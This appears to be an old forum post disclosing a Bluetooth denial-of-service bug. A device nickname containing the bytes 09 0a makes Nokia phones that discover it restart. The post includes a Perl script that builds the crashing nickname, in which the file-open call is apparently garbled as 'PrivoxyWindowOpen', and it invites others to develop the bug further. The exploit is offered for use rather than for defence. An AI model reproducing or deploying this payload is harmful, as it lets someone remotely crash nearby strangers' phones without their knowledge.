When i was playing with my bluetooth device,
i found that if you add in your nickname " 09 0a " in hex, it will cause that every one who search for available bluetooth devices and find your nickname his nokia phone will restart.
you should add a nicname like that,

[something][09 0a in hex][just add anything here]

you should add anything before 09 0a because the nokia phones think that its a space at the end, and it will auto deleted so you should add any thing before 090a .

#!/usr/bin/perl -w

my $btnick;
my $bth;
my  $bts;
my $file;
$bth = "	.";
print "\n*******************************************************\n";
print "**    NOKIA REMOTE RESTART IN BLUETOOTH NICKNAME     **\n";
print "**      BY QNIX | Q-nix[@]bsdmail[dot]org            **\n";
print "*******************************************************\n";
print " \n write your nickname : ";
$btnick = <STDIN>;
chomp($btnick);
print " \n OUTPUT : ";
$file = <STDIN>;
chomp($file);
PrivoxyWindowOpen(BLUEN, ">>$file") || die "Could not create file $!\n";
$bts = "$btnick$bth";
print BLUEN ("$bts");
close(BLUEN);
 
print "\n Done !! , send the output to your nokia and copy the file to the bluetooth nickname space . \n\n";

may be someone got more information about that bug or any thing else.
and maybe someone can develop that problem.
